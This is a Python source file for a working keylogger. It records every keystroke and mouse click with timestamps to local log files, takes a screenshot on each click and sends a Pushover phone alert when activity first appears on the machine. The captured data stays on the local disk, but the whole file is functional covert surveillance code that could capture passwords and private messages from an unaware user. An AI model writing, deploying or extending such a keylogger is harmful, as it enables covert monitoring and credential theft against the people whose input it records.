from pynput import keyboard, mouse
import time
import urllib
import http.client
from config import USER_KEY, API_KEY
import os
from threading import Thread, Event
import dxcam
from PIL import Image

first_key_pressed = False
stop_listeners_event = Event()

def on_press(key):
    global first_key_pressed
    current_time = time.localtime()
    timestamp = time.strftime("%D-%H:%M:%S: ", current_time)
    if not first_key_pressed:
                send_notification()
                first_key_pressed = True
                
    with open(log_filepath, "a") as file:
        try:    
            file.write(timestamp + key.char + "\n")
        except AttributeError:
            file.write(timestamp  + f'[{key}]' + "\n")
        file.flush()
        
def on_release(key):
    if key == keyboard.Key.esc:
        stop_listeners_event.set()
        return False
    
def on_click(x, y, button, pressed):
    global first_key_pressed
    if stop_listeners_event.is_set():
        return False
    
    
    current_time = time.localtime()
    timestamp = time.strftime("%D-%H:%M:%S: ", current_time)
    action = 'Pressed' if pressed else 'Released'
    take_screenshot()
    if not first_key_pressed:
                send_notification()
                first_key_pressed = True
    with open(log_filepath, "a") as file:
        file.write(timestamp + f'Mouse {action} at ({x}, {y}) with {button}' + "\n")

def send_notification():
    conn = http.client.HTTPSConnection("api.pushover.net:443")
    conn.request("POST", "/1/messages.json",
    urllib.parse.urlencode({
        "token": API_KEY,
        "user": USER_KEY,
        "title": "Acitivty Alert",
        "message": "There is activity on EGM",
        "url": "",
        "priority": "0" 
    }), { "Content-type": "application/x-www-form-urlencoded" })
    conn.getresponse()
    
def take_screenshot():
    camera = dxcam.create()
    frame = camera.grab()
    
    current_time = time.localtime()
    timestamp = time.strftime("%Y-%m-%d-%H-%M-%S", current_time)
    screenshot_name = f'screenshot-{timestamp}.png'
    path = "C:\\Users\\ellio\\Desktop\\Keylogger\\Screenshots"
    screenshot_path = os.path.join(os.sep, path, screenshot_name)
    
    image = Image.fromarray(frame)
    image.save(screenshot_path)

def start_keyboard_listener():
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        listener.join()

def start_mouse_listener():
    with mouse.Listener(
        on_click=on_click) as Listener:
        Listener.join()

current_time = time.localtime()
timestamp = time.strftime("%Y-%m-%d", current_time)  # Use hyphens instead of slashes
path = "C:\\Users\\ellio\\Desktop\\Keylogger\\Logs"
filename = str(timestamp + ".log")
log_filepath = os.path.join(path, filename)

keyboard_thread = Thread(target=start_keyboard_listener)
mouse_thread = Thread(target=start_mouse_listener)

keyboard_thread.start()
mouse_thread.start()

keyboard_thread.join()
mouse_thread.join()